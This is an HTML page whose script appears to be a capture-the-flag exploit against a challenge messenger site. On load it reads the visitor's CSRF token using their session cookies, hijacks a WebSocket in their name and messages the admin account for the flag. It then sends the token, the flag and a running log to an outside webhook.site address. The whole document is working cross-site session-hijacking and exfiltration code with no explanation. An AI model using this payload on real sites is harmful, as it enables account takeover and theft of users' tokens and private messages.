<!DOCTYPE html>
<html>
<body>
<script>
const HOOK = 'https://webhook.site/7cf33045-2392-42a9-80d5-ef4a7ea32395';
const BASE = 'https://vka-messenger.ru';

function log(msg) {
  fetch(HOOK + '?log=' + encodeURIComponent(msg));
}

log('page_loaded');

(async () => {
  try {
    const me = await fetch(BASE + '/api/me', { credentials: 'include' }).then(r => r.json());
    log('got_csrf_' + me.csrf);

    const ws = new WebSocket('wss://vka-messenger.ru/ws');

    ws.onopen = () => log('ws_open');
    ws.onerror = (e) => log('ws_error_' + e.message);

    ws.onmessage = async (e) => {
      const msg = JSON.parse(e.data);
      log('ws_msg_' + msg.type);

      if (msg.type === 'hello') {
        ws.send(JSON.stringify({ op: 'open_dm', username: 'admin' }));
      }
      if (msg.type === 'dm_opened') {
        ws.send(JSON.stringify({ op: 'send_message', chat_id: msg.chat_id, body: 'flag' }));
      }
      if (msg.type === 'message' && msg.message?.body?.includes('vkactf{')) {
        log('FLAG_' + msg.message.body);
        window.__desklineDone = true;
      }
    };
  } catch(e) {
    log('error_' + e.message);
  }
})();
</script>
</body>
</html>
